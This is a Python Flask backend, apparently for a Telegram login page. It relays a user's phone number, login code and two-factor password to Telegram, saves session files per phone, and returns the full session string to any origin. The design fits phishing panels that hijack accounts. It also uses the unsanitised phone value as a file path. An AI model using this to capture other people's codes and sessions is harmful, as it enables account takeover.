from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from flask_cors import CORS
import os
from dotenv import load_dotenv

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

SESSION_DIR = "session"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

app = Flask(__name__)
CORS(app)

@app.route("/")
def home():
    return "Telegram Login Backend Aktif"

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")

    if not phone:
        return jsonify({"error": "Nomor telepon kosong"}), 400

    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
    try:
        client.connect()
        client.send_code_request(phone)
        return jsonify({"status": "code_sent"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        client.disconnect()

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
    try:
        client.connect()
        client.sign_in(phone=phone, code=code)
        session_str = StringSession.save(client.session)
        return jsonify({"status": "logged_in", "session": session_str})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        client.disconnect()

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    client = TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH)
    try:
        client.connect()
        client.sign_in(password=password)
        session_str = StringSession.save(client.session)
        return jsonify({"status": "logged_in", "session": session_str})
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    finally:
        client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
